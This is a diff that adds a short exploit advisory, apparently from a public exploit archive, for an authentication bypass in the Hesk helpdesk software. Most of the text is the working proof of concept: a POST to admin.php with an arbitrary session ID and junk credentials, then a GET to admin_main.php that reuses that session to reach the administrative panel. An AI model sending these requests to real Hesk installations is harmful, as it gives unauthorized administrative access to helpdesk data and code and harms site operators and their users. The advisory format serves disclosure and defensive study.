@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/14879/info
+
+Hesk is prone to an authentication bypass vulnerability.
+
+Successful exploitation will grant an attacker administrative access to the application. This can lead to unauthorized access of sensitive data, modification of helpdesk data and program code, and other types of attacks. 
+
+1. HTTP POST request with randomly chosen Session ID:
+POST admin.php +
+("Host: www.example.com
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.example.com/hesk/admin.php
+Cookie: PHPSESSID=12345 <!-- Random Session ID--!>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+user=1&pass=sdfd&a=do_login");
+
+2. GET request to administrative control panel:
+GET admin_main.php +
+("Host: www.example.com
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Cookie: PHPSESSID=12345") <!-- Session ID --!> 
